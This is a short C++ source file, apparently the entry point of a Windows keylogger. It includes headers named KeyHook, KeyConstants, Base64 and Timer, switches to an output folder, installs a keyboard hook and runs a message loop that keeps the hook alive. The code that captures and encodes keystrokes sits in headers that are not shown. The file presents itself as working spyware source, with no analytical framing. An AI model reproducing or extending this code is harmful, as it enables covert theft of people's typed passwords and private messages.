#include <iostream>
#include <windows.h>
#include "Base64.h"
#include "Helper.h"
#include "KeyConstants.h"
#include "IO.h"
#include "Timer.h"
#include "KeyHook.h"

using namespace std;

int main()

{
    MSG Msg;
    IO::ChcDr(IO::GetOPath(true));
    InstallHook();
    while(GetMessage (&Msg, NULL, 0,0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    return 0;

}
